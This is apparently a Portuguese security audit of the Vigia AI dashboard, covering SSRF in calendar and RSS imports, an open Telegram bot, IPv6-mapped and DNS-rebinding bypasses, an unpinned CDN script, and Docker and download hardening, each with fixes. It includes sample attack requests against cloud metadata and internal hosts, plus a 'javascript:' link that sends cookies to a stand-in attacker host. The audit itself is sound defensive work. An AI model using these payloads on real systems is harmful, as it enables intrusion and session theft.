# Revisão de Segurança — Vigia AI

**Data:** 2026-09-05
**Escopo:** backend (`backend/src/**`, Node 22 + Fastify + Zod), frontend (`frontend/src/**`), desktop/Electron (`desktop/src/**`), firmware ESP32 (`firmware/src/**`), infra (`compose.yaml`, `Dockerfile`, `./dev`, `scripts/*`)
**Método:** leitura integral do código-fonte próprio do projeto (excluindo dependências de terceiros e testes), com verificação manual linha-a-linha de cada achado abaixo contra o código real antes de entrar neste documento.

> Esta é uma revisão inteiramente nova. A revisão anterior (datada de 2026-09-02) cobria o backend em **Python/FastAPI** (`backend/app/**`), que foi completamente removido do repositório e reescrito em **Node 22 + Fastify** (`backend/src/**`) — ver [`.agents/DECISOES.md`](.agents/DECISOES.md). Nenhum achado do documento anterior foi copiado sem reverificação: o `ssrfGuard.ts` criado especificamente para mitigar o antigo Finding 1 (SSRF em wallpapers) foi auditado de novo, e dois recursos novos desde então (Calendário e RSS) foram incluídos no escopo por reproduzirem a mesma classe de vulnerabilidade.

## Contexto importante

O Vigia AI é assumido pelo próprio projeto como um gadget **local, "LAN only"**: a documentação afirma explicitamente que a porta 8787 não deve ser exposta na internet e que tokens de provedores "nunca" saem do computador do coletor. Isso reduz a severidade de achados que dependeriam de exposição direta à internet — mas não elimina o risco, pois vários achados abaixo são exploráveis por qualquer host na mesma LAN (convidado, dispositivo IoT comprometido, vizinho em rede compartilhada). Nenhuma rota do backend exige autenticação própria — decisão de design documentada, não um achado isolado — mas continua sendo o multiplicador de vários achados abaixo (SSRF, escrita de notas, etc. são exploráveis por qualquer requisição HTTP direta na LAN).

O bot do Telegram, ao contrário da API HTTP, **é alcançável pela internet pública** via servidores do Telegram — a isenção "LAN only" não se aplica a ele (ver Finding 3).

## Resumo ranqueado

| # | Vulnerabilidade | Severidade | Confiança | Local |
|---|---|---|---|---|
| 1 | SSRF sem allowlist de host na importação de calendário (ICS) | **HIGH** | 9/10 | `backend/src/providers/calendar.ts:293-338` |
| 2 | SSRF sem allowlist de host na importação de feeds RSS/Atom | **HIGH** | 9/10 | `backend/src/providers/rss.ts:215-250` |
| 3 | Bot do Telegram aceita comandos de qualquer remetente, sem allowlist | **HIGH** | 8/10 | `backend/src/telegram/bot.ts:208-326` |
| 4 | Bypass de endereço IPv4-mapeado-em-IPv6 no guard de SSRF dos wallpapers | **MEDIUM-HIGH** | 8/10 | `backend/src/routers/wallpapers/ssrfGuard.ts:54-63` |
| 5 | Script de terceiro sem pin/SRI, carregado de branch mutável (`@main`) | **MEDIUM-HIGH** | 9/10 | `frontend/src/hooks/useNameToColor.ts:3-4,35-44` |
| 6 | DNS rebinding (TOCTOU) entre validação e fetch no guard de SSRF | **MEDIUM** | 7/10 | `backend/src/routers/wallpapers/ssrfGuard.ts:67-124` |
| 7 | Link `javascript:`/`data:` não sanitizado em itens de feed RSS | **MEDIUM** | 8/10 | `backend/src/providers/rss.ts:96-109`, `frontend/src/components/cards/RssCard.tsx:120,210,247` |
| 8 | Texto de exceção não escapado refletido no callback OAuth do AdSense | **LOW** | 7/10 | `backend/src/routers/adsense.ts:42-49,94-98` |
| 9 | Container Docker roda como root sem hardening | **LOW** | 9/10 | `Dockerfile` (estágio final), `compose.yaml` |
| 10 | Download do `wokwigw` sem verificação de checksum/assinatura | **LOW** | 8/10 | `dev:137-176` |

---

## Finding 1 — SSRF sem allowlist de host na importação de calendário (ICS)

**Severidade:** HIGH · **Confiança:** 9/10
**Local:** `backend/src/providers/calendar.ts:293-338` (`fetchIcsText`), `backend/src/routers/calendar.ts` (`POST /api/calendar/calendars`, `PATCH /api/calendar/calendars/:id`, `POST /api/calendar/preview`)

**Descrição:** `fetchIcsText` busca a URL informada pelo cliente sem qualquer validação de IP/host. O único controle em toda a cadeia é um regex `^https?://` (`isValidCalendarUrl`, `calendar.ts:50-56`). O próprio comentário do código admite a lacuna: *"SSRF guard: reuse logic from wallpapers but inline simple check ... For now, just validate URL shape and fetch with redirect limit"* (`calendar.ts:295-297`) — mas isso nunca foi implementado. Redirects são seguidos (`redirect: "manual"` + resolução manual do `Location`) sem revalidação em nenhum hop. Corpos de resposta não-2xx (até 300 chars) são ecoados no campo `error`, permitindo exfiltração parcial de conteúdo de serviços internos.

**Cenário de exploração:**
```
POST /api/calendar/preview HTTP/1.1
Host: <ip-do-dispositivo>:8787
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "kind": "events"}
```
ou contra qualquer host/porta interna da LAN (`http://192.168.1.1/`, `http://127.0.0.1:8787/api/config`, painéis administrativos internos). O mesmo payload persiste permanentemente via `POST /api/calendar/calendars`, fazendo o backend re-buscar a URL a cada ciclo de poll.

**Recomendação:** Chamar `validatePublicUrl` (de `backend/src/routers/wallpapers/ssrfGuard.ts`) — ou extrair essa lógica para um módulo compartilhado — antes de cada fetch em `fetchIcsText`, revalidando também a cada redirect, no mesmo padrão de `ssrfGuard.downloadImage`.

---

## Finding 2 — SSRF sem allowlist de host na importação de feeds RSS/Atom

**Severidade:** HIGH · **Confiança:** 9/10
**Local:** `backend/src/providers/rss.ts:215-250` (`fetchRssText`), `backend/src/routers/rss.ts` (`POST /api/rss/feeds`, `PATCH /api/rss/feeds/:id`, `POST /api/rss/preview`)

**Descrição:** Idêntico ao Finding 1 — `fetchRssText` busca a URL bruta informada pelo cliente sem chamar `isBlockedHost`/`validatePublicUrl` em nenhum ponto, só o shape-check `^https?://` no router (`isValidRssUrl`). Redirects são seguidos sem revalidação.

**Cenário de exploração:**
```
POST /api/rss/preview HTTP/1.1
Host: <ip-do-dispositivo>:8787
Content-Type: application/json

{"url": "http://127.0.0.1:8787/api/config"}
```
Permite port-scanning interno, acesso a endpoints de metadata de nuvem e pivô para serviços HTTP internos da LAN, a partir de qualquer cliente que alcance o `/api` do dashboard.

**Recomendação:** Mesma do Finding 1 — rotear `fetchRssText` pelo guard de SSRF compartilhado.

---

## Finding 3 — Bot do Telegram aceita comandos de qualquer remetente, sem allowlist

**Severidade:** HIGH · **Confiança:** 8/10
**Local:** `backend/src/telegram/bot.ts:208-326` (`pollOnce`, registro automático em `addChat` na linha 248, dispatch de comandos nas linhas 251-323); amplificado por `broadcast()` (linhas 166-206), que envia a todo chat registrado sem distinguir dono de estranho.

**Descrição:** `pollOnce` processa toda mensagem recebida via `getUpdates` sem checar o `chatId` contra nenhuma allowlist. Qualquer chat que mande mensagem ao bot é auto-registrado (`addChat`), e se a mensagem for `/info`, `/note`, `/tasklist` ou `/help`, é atendida normalmente, venha de quem vier:
- `/info` (via `handleInfoQuery`) devolve o payload de uso completo formatado: % de cota Claude/GPT/Cursor, saldo on-demand do Cursor, créditos OpenRouter/DeepSeek/fal.ai, **ganhos e saldo da carteira do AdSense**, **endereço Bitcoin + saldo BTC + valor em USD/BRL**, localização do clima, títulos/locais de eventos de calendário, commits de git e conteúdo de RSS.
- `/note` e `/tasklist` deixam o remetente escrever conteúdo arbitrário direto no dashboard do usuário.
- Uma vez auto-registrado, o chat do atacante também passa a receber todo alarme futuro disparado por `alarms/engine.ts` (limites de cota, lembretes de calendário) — transformando uma consulta pontual num canal de vazamento persistente.

Diferente da API HTTP ("LAN only" por design), o bot do Telegram é alcançável pela internet pública via servidores do Telegram — a isenção de "LAN only" não se aplica aqui, e não existe nenhum outro mecanismo de autorização.

**Cenário de exploração:** um atacante que descubra o `@username` do bot (vazado em print, mensagem encaminhada, ou histórico do BotFather) abre uma conversa e manda `/info`. Recebe imediatamente um retrato financeiro/de uso completo (ganhos AdSense, saldo/endereço Bitcoin, estado de cotas de API). Também pode poluir o dashboard da vítima com `/tasklist`/`/note`, e passa a receber silenciosamente todos os alarmes futuros.

**Recomendação:** manter uma allowlist explícita de `chat_id`s autorizados (por exemplo, populada só via um código de pareamento de uso único mostrado no painel local), e rejeitar/ignorar comandos de chats fora dela — incluindo não chamar `addChat` para eles. No mínimo, restringir `/info`, `/note` e `/tasklist` à allowlist mesmo que o registro via `/start` continue aberto.

---

## Finding 4 — Bypass de endereço IPv4-mapeado-em-IPv6 no guard de SSRF dos wallpapers

**Severidade:** MEDIUM-HIGH · **Confiança:** 8/10
**Local:** `backend/src/routers/wallpapers/ssrfGuard.ts:54-63` (`isBlockedIp`, ramo IPv6)

**Descrição:** o ramo IPv6 de `isBlockedIp` só bloqueia `::1`, `::`, `fe80:` (link-local), `fc`/`fd` (unique-local), `ff` (multicast) e a string literal `::ffff:127.0.0.1`. Ele **não decodifica** endereços IPv4-mapeados-em-IPv6 genéricos (`::ffff:a.b.c.d` ou a forma hex `::ffff:xxxx:xxxx`) para revalidar o IPv4 embutido contra a blocklist de IPv4. Um nome DNS controlado pelo atacante que devolva um registro AAAA como `::ffff:169.254.169.254` ou `::ffff:192.168.1.1` passa por `isBlockedIp` sem ser bloqueado, mesmo resolvendo para um endereço privado/link-local/metadata em host dual-stack.

**Cenário de exploração:** atacante configura DNS autoritativo para `evil.example.com` com `AAAA ::ffff:169.254.169.254`, depois:
```
POST /api/wallpapers/import HTTP/1.1
Content-Type: application/json

{"provider": "wallhaven", "image_url": "http://evil.example.com/x.jpg", "id": "1"}
```
(`wallhaven` não exige API key, então nenhum segredo de provedor é necessário para alcançar `downloadImage`.)

**Recomendação:** no ramo IPv6, detectar endereços IPv4-mapeados (`/^::ffff:/i` nas formas decimal e hex, e a forma compatível `::a.b.c.d`), extrair o IPv4 de 32 bits embutido e reaplicar a lógica de `isBlockedIp` de IPv4 sobre ele antes de decidir.

---

## Finding 5 — Script de terceiro sem pin/SRI, carregado de branch mutável (`@main`)

**Severidade:** MEDIUM-HIGH (navegador) / **HIGH** no app desktop · **Confiança:** 9/10
**Local:** `frontend/src/hooks/useNameToColor.ts:3-4,35-44`

**Descrição:** o hook injeta `<script src="https://cdn.jsdelivr.net/gh/zonaro/NameToColor@main/...">` — `@main` é uma branch mutável, não um commit/tag fixo — sem atributo `integrity` (SRI). Quem conseguir dar push (ou comprometer) a branch `main` de `zonaro/NameToColor`, ou comprometer o cache do proxy GitHub do jsDelivr, ganha execução de script arbitrário em toda sessão do Vigia AI que toque o recurso de nomeação de cor (usado em `ThemeEditorPage.tsx`, `NameToColorPicker.tsx`, `TileColorPicker.tsx`, `SettingsDrawer.tsx`, `TileCards.tsx`, `BoardTile.tsx`). Não há CSP no `frontend/index.html` para conter isso.

**Escalada no app desktop:** `desktop/src/preload.ts` usa `contextBridge.exposeInMainWorld("vigia", api)` — o padrão correto e recomendado do Electron — mas isso coloca a API `window.vigia` no mesmo *main world* que scripts de página comuns, incluindo este script carregado dinamicamente. Um payload comprometido dessa dependência CDN pode então chamar `window.vigia.setLanExposure(true)` (muda o bind do coletor de `127.0.0.1` para `0.0.0.0`, expondo toda a API local — notas, endpoints de config, token do Telegram — para a LAN inteira sem consentimento do usuário), `window.vigia.restartCollector()`, `window.vigia.openExternal(url)` ou `window.vigia.saveFile(...)` (confirmado em `desktop/src/preload.ts:28-43`).

**Recomendação:** vendorizar a biblioteca (bundle via npm/arquivo local) ou fixar em um commit SHA/tag exato servido com `integrity` correspondente — nunca usar `@main`. Se a carga dinâmica for mantida, adicionar `s.integrity` + `s.crossOrigin = "anonymous"`.

---

## Finding 6 — DNS rebinding (TOCTOU) entre validação e fetch no guard de SSRF

**Severidade:** MEDIUM · **Confiança:** 7/10
**Local:** `backend/src/routers/wallpapers/ssrfGuard.ts:67-124` (`downloadImage`, `httpJson`)

**Descrição:** `validatePublicUrl` faz seu próprio `dns.lookup` para checar o(s) IP(s) resolvido(s), e em seguida uma chamada `fetch()` totalmente separada é feita para o mesmo hostname. O `fetch` do Node (undici) faz sua própria resolução DNS independente no momento da conexão — não há nenhum mecanismo fixando o IP validado ao IP realmente conectado. Um atacante que controle o DNS autoritativo do hostname-alvo (trivial, é o domínio dele) pode servir um IP público/seguro na consulta de validação e um IP privado/loopback/metadata na consulta de conexão, momentos depois ("DNS rebinding" clássico, por exemplo com TTL=0 ou respostas alternadas). Isso vale tanto para a URL inicial quanto para cada hop de redirect, já que cada revalidação tem a mesma estrutura validar-depois-buscar-de-novo.

**Cenário de exploração:** atacante roda DNS autoritativo para `rebind.attacker.com` que responde a 1ª consulta com `1.2.3.4` (passa em `isBlockedHost`) e a 2ª consulta (feita pelo conector do undici durante o `fetch`) com `127.0.0.1` ou `169.254.169.254`. `POST /api/wallpapers/import` com `image_url: "http://rebind.attacker.com/x.jpg"` e `provider: "wallhaven"`.

**Recomendação:** resolver o hostname uma vez, validar o IP resolvido, e então conectar diretamente nesse IP fixado (via um `dns.lookup` customizado / hook de `connect` num `Agent` do undici, ou reescrevendo a requisição para o IP literal preservando o header `Host` original para SNI/vhosting) em vez de deixar um `fetch(url)` simples re-resolver.

---

## Finding 7 — Link `javascript:`/`data:` não sanitizado em itens de feed RSS

**Severidade:** MEDIUM · **Confiança:** 8/10
**Local:** `backend/src/providers/rss.ts:96-109` (`extractLink`), consumido em `frontend/src/components/cards/RssCard.tsx:120,210,247`

**Descrição:** `extractLink()` valida `^https?://` apenas no caminho de `<link>url</link>` estilo RSS puro (linha 99). Se esse teste falhar, cai no caminho Atom `href="..."` (linha 102) **sem nenhuma checagem de esquema**, e por fim, se nada casar, retorna o texto bruto e não validado da tag `<link>` (linha 109: `return rssLink || null;`). Esse valor chega ao frontend como `item.link` e é renderizado diretamente como `href` de `<a>` em três pontos de `RssCard.tsx`, sem filtro de esquema.

**Cenário de exploração:** um feed adicionado pelo usuário (ou cujo servidor/DNS upstream seja comprometido) retorna:
```xml
<item><title>Update available</title><link>javascript:fetch('http://attacker/x?c='+document.cookie)</link></item>
```
O fallback do parser devolve essa string como está. Quando o usuário clica no item no card de RSS, o `javascript:` executa no contexto da página — no navegador é execução de script na origem do dashboard; no app Electron, o renderer tem acesso a `window.vigia` (ver Finding 5).

**Recomendação:** em `extractLink`, remover o fallback incondicional da linha 109 — devolver `null` em vez de string não validada quando nenhum link `http(s)://` for encontrado. Em profundidade, no frontend: antes de renderizar `href`, permitir só os esquemas `http:`/`https:` (ex.: checar `new URL(item.link).protocol`) e não renderizar como link caso contrário.

---

## Finding 8 — Texto de exceção não escapado refletido no callback OAuth do AdSense

**Severidade:** LOW · **Confiança:** 7/10
**Local:** `backend/src/routers/adsense.ts:42-49` (`htmlRedirect`, sem escapar o parâmetro `message`), acionado em `:94-98` (`htmlRedirect(..., String(exc))`); o texto refletido vem de `httpClient.ts:222-230`, que embute até 300 bytes crus do corpo de resposta de terceiro na mensagem de erro.

**Descrição:** `htmlRedirect(url, message)` escapa `url` mas nunca escapa `message` antes de interpolar em `<p>${message}</p>`. O único chamador que passa texto não-constante é o path de falha de `exchangeCode`, onde `message = String(exc)`. Se o endpoint de token do Google devolver uma resposta não-2xx, o erro inclui até 300 caracteres crus do corpo dessa resposta, sem escape, direto nesta página HTML.

**Cenário de exploração:** exploração prática exigiria que a própria resposta de erro do Google contivesse HTML não escapado — o que o Google normalmente não produz (retorna JSON estrito). Não é controlável diretamente via `code`/`state` do OAuth. É um defeito real de falta de encoding de saída numa superfície construída justamente para ecoar erro ao navegador, mas a exploração hoje é limitada pelo Google ser a única fonte realista do texto refletido.

**Recomendação:** escapar `message` em `htmlRedirect` da mesma forma que `url` já é escapado, ou parar de ecoar texto de exceção cru ao navegador — usar uma mensagem genérica ("falha na conexão") e logar o erro detalhado só no servidor.

---

## Finding 9 — Container Docker roda como root sem hardening

**Severidade:** LOW · **Confiança:** 9/10
**Local:** `Dockerfile` (estágio final `node:22-alpine`, sem diretiva `USER`), `compose.yaml`

**Descrição:** o estágio final do `Dockerfile` nunca adiciona `USER`, então o processo (e o `npm install --omit=dev`) roda como root (uid 0) dentro do container. `compose.yaml` também não define `cap_drop`, `read_only` ou `security_opt: no-new-privileges`. A imagem `node:22-alpine` já vem com um usuário `node` não privilegiado pronto, mas não é usado. `compose.yaml` monta `./backend/data:/app/data` gravável do host. Isso é uma lacuna de hardening distinta de "sem auth na LAN": é sobre o raio de explosão caso o processo Node seja comprometido no futuro (ex.: um RCE de dependência) — um processo root no container tem mais capacidade de interagir com volumes montados e sobrescrever permissões/ownership em `backend/data`.

**Cenário de exploração:** não é explorável isoladamente por um atacante de rede hoje; remove uma camada padrão de defesa em profundidade — se ocorrer um RCE futuro no backend, o atacante ganha root dentro do container em vez de um usuário sem privilégios.

**Recomendação:** adicionar `USER node` (garantindo ownership de `/app` para esse usuário, ex. `COPY --chown=node:node`) antes do `CMD` no estágio final; em `compose.yaml`, considerar `read_only: true` com `tmpfs` para diretórios de scratch e `cap_drop: [ALL]`.

---

## Finding 10 — Download do `wokwigw` sem verificação de checksum/assinatura

**Severidade:** LOW (ferramenta de desenvolvimento, não produção) · **Confiança:** 8/10
**Local:** `dev:137-176` (`ensure_wokwigw()`)

**Descrição:** `ensure_wokwigw()` baixa `wokwigw_${WOKWIGW_VERSION}_${WOKWIGW_ASSET}.zip` de uma URL de GitHub Releases via `curl -fsSL`, extrai em `.tools/` e dá `chmod +x` no binário — **sem nenhuma verificação de checksum ou assinatura**. O binário é depois executado diretamente como parte de `./dev wokwi`. Ao contrário do caminho de download do Electron (que se apoia na verificação de checksum do próprio instalador npm/electron-builder), não existe âncora de confiança equivalente aqui.

**Cenário de exploração:** um asset de release comprometido, uma chave de assinatura de release comprometida, ou um ataque de supply-chain no repositório `wokwi/wokwigw` poderiam substituir o binário nessa URL/versão exata, resultando em execução de código arbitrário na máquina do desenvolvedor na próxima vez que `./dev wokwi` rodar.

**Recomendação:** fixar e verificar um checksum SHA-256 por combinação `WOKWIGW_VERSION`/plataforma antes do `chmod +x`, abortando com instrução de instalação manual se o hash não bater.

---

## O que foi verificado e considerado seguro (sem achados)

- **Injeção de comando:** nenhum uso de `exec`/`execSync`/`spawn` com `shell: true` interpolando entrada de usuário em `backend/src/local/**` (leitura de Keychain/`state.vscdb`) nem em `desktop/src/sidecar.ts` (spawn do coletor via array de argumentos).
- **SQL injection:** `local/cursorState.ts` usa queries parametrizadas (`?`) tanto no caminho `node:sqlite` quanto `better-sqlite3`; nenhuma concatenação de string com entrada externa.
- **Path traversal:** `wid` de wallpapers rejeita `/`/`\` em todas as rotas; caminhos de credenciais (`local/*.ts`) só são configuráveis via variável de ambiente do lado servidor, não por HTTP; static files (`main.ts`) resolvem e validam `p.startsWith(root)` antes de servir.
- **Prototype pollution:** o único merge de campos vindos de usuário em `config.ts` coerce cada valor via `Boolean(fv)` antes de atribuir — atribuir primitivo a `__proto__` é no-op no JS, sem poluição possível.
- **CORS:** nenhum plugin `@fastify/cors` nem header `Access-Control-Allow-Origin` manual registrado em `main.ts` — Fastify não adiciona CORS por padrão.
- **Vazamento de segredo em resposta HTTP:** `/api/config` só devolve os últimos 4 caracteres de segredos armazenados; `/api/telegram/status` nunca devolve `bot_token`; o payload de `/usage` (que também alimenta `/info` do Telegram) não contém nenhum campo de token/segredo.
- **Redirects em wallpapers:** `ssrfGuard.downloadImage`/`httpJson` usam `redirect: "manual"` e revalidam a URL a cada hop (até 5), com limite de 10MB via truncamento de stream — correto, à parte dos Findings 4 e 6 acima.
- **Firmware ESP32 (`theme_server.cpp`, `customtheme.cpp`):** todos os caminhos de entrada de rede (`handlePostMeta` limitado a 8192 bytes antes do parse, `handleBackgroundUpload` validado contra `canvasWidth*canvasHeight*2`, `parseTheme()` via ArduinoJson com todas as strings copiadas para buffers fixos via `toCharArray` que trunca com segurança) — nenhum `strcpy`/`sprintf`/`memcpy` não limitado sobre dado controlado pela rede.
- **`.gitignore`:** `firmware/src/secrets.h`, `backend/data/*.json` e `backend/data/wallpapers/` seguem corretamente excluídos e não versionados.
- **Electron — `contextIsolation`/`nodeIntegration`:** `desktop/src/main.ts` usa `contextIsolation: true`, `nodeIntegration: false`; `preload.ts` expõe só uma allowlist fechada de canais IPC específicos (nenhum `ipcRenderer.invoke` genérico); `will-navigate`/`setWindowOpenHandler` restringem navegação in-window a `127.0.0.1`/`localhost`/`data:`.
- **`NoteCard.tsx` (`dangerouslySetInnerHTML`):** único uso no frontend inteiro; o renderer de Markdown escapa HTML antes de qualquer transformação e exige prefixo `https?://` em links/autolinks — nenhuma injeção construível hoje, ainda que seja um ponto frágil a monitorar por ser um board compartilhado sem autenticação.
- **`postMessage`:** nenhum listener `window.addEventListener("message", ...)` em `frontend/src` ou `desktop/src`.
- **Segredos no frontend:** nenhum token/API key gravado em `localStorage`/`sessionStorage`/querystring — todos trafegam só via `fetch(...).body` para o backend.
